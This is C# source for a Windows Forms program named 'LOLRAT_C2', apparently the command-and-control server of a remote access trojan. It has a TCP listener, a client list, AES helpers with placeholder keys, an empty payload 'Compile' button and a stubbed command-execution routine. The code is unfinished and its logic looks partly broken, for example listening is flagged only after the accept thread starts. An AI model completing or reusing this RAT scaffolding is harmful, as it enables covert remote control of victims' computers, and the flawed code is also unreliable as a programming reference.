using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.Text;
using System.IO;

namespace LOLRAT_C2
{
    public partial class Form1 : Form
    {
        private TcpListener server;
        private List<TcpClient> connectedClients = new List<TcpClient>();
        private bool isListening = false;

        public Form1()
        {
            InitializeComponent();
        }

        private static byte[] encryptionKey = Encoding.ASCII.GetBytes("YourEncryptionKey");
        private static byte[] encryptionIV = Encoding.ASCII.GetBytes("YourEncryptionIV");

        private byte[] EncryptData(string data)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = encryptionKey;
                aesAlg.IV = encryptionIV;

                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(data);
                        }
                    }

                    return msEncrypt.ToArray();
                }
            }
        }

        private string DecryptData(byte[] encryptedData)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = encryptionKey;
                aesAlg.IV = encryptionIV;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream msDecrypt = new MemoryStream(encryptedData))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            return srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
        }

        private void AddClientToListBox(string clientIP)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => AddClientToListBox(clientIP)));
            }
            else
            {
                listBoxClients.Items.Add(clientIP);
            }
        }

        private void RemoveClientFromListBox(string clientIP)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => RemoveClientFromListBox(clientIP)));
            }
            else
            {
                listBoxClients.Items.Remove(clientIP);
            }
        }


        private void StartListener(int port)
        {
            try
            {
                server = new TcpListener(IPAddress.Any, port);
                server.Start();
                UpdateStatus($"Listening on port {port}...");

                Thread listenerThread = new Thread(() =>
                {
                    while (isListening)
                    {
                        try
                        {
                            TcpClient client = server.AcceptTcpClient();
                            connectedClients.Add(client);
                            UpdateStatus($"Client connected from {((IPEndPoint)client.Client.RemoteEndPoint).Address}");

                            Thread clientThread = new Thread(() => HandleClient(client));
                            clientThread.Start();
                        }
                        catch (SocketException)
                        {
                            // Handle exceptions as needed.
                        }
                    }
                });

                listenerThread.Start();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error starting listener: {ex.Message}");
            }
        }

        private void HandleClient(TcpClient client)
        {
            try
            {
                NetworkStream stream = client.GetStream();
                StreamReader reader = new StreamReader(stream, Encoding.UTF8);
                StreamWriter writer = new StreamWriter(stream, Encoding.UTF8);

                while (isListening)
                {
                    try
                    {
                        string command = reader.ReadLine();
                        if (string.IsNullOrEmpty(command))
                        {
                            break; // Client disconnected
                        }

                        // Execute the command
                        string result = ExecuteCommand(command);

                        // Send the result back to the client
                        writer.WriteLine(result);
                        writer.Flush();
                    }
                    catch (IOException)
                    {
                        // Handle exceptions as needed.
                    }
                }

                client.Close();
                connectedClients.Remove(client);
                UpdateStatus($"Client disconnected from {((IPEndPoint)client.Client.RemoteEndPoint).Address}");
            }
            catch (Exception ex)
            {
                // Handle exceptions as needed.
            }
        }

        private string ExecuteCommand(string command)
        {
            // Implement command execution here.
            // You can use Process.Start to execute system commands.
            // Make sure to capture the command's output and return it as a result.
            return "Command execution result";
        }


        private void UpdateStatus(string message)
        {
            lbChat.Items.Add($"{message}");
        }

        private void StopListener()
        {
            isListening = false;
            server.Stop();
            UpdateStatus("Server stopped.");
        }

        private void btnCompile_Click(object sender, EventArgs e)
        {

        }

        private void btnListen_Click(object sender, EventArgs e)
        {
            if (!isListening)
            {
                int ActivePort;
                if (int.TryParse(txtActivePort.Text, out ActivePort))
                {
                    StartListener(ActivePort);
                    isListening = true;
                    btnListen.Text = "Stop Listening";
                }
                else
                {
                    MessageBox.Show("Invalid port number. Please enter a valid integer.");
                }
            }
            else
            {
                StopListener();
                isListening = false;
                btnListen.Text = "Start Listening";
            }
        }
    }
}
